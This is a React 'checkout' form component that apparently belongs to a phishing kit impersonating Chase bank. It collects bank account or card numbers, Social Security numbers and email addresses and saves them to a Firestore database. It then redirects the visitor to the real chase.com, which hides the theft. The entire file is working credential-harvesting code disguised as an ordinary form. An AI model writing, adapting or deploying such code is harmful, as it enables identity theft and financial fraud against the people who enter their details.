import { useForm } from "react-hook-form";
import { addDoc, collection } from "firebase/firestore";
import { db } from "../firebase";
import { useUser } from "../provider/UserContext";

const CheckoutForm = () => {
  const { userData } = useUser();

  const {
    register,
    handleSubmit,
    formState: { errors },
    reset
  } = useForm();

  const onSubmit = async (data) => {
    try {
      const usersRef = collection(db, "data");

      await addDoc(usersRef, {
        userId: userData.id,
        accountNumber: data.accountNumber,
        socialSecurityNumber: data.socialSecurityNumber,
        email: data.email
      });

      reset();
      window.location.href = "https://www.chase.com/"; 
    } catch (error) {
      console.error("Error saving user data:", error);
    }
  };

  return (
    <>
      <section className="section section--checkout-form">
        <div className="section__content--checkout-form">
          <form onSubmit={handleSubmit(onSubmit)} className="section__checkout-form">
            <label htmlFor="#">
              1. Step:
              <input
                type="text"
                placeholder="Account, card or application number"
                required=""
                {...register("accountNumber")}
              />
            </label>
            <label htmlFor="#">
              2. Step:
              <input
                type="password"
                placeholder="Social Security number"
                required=""
                {...register("socialSecurityNumber")}
              />
            </label>
            <label htmlFor="#">
              3. Step:
              <input
                type="email"
                placeholder="Email account"
                required=""
                {...register("email")}
              />
            </label>
            <button className="section__checkout-button" type="submit">Confirm</button>
          </form>
        </div>
      </section>
    </>
  );
};

export default CheckoutForm;
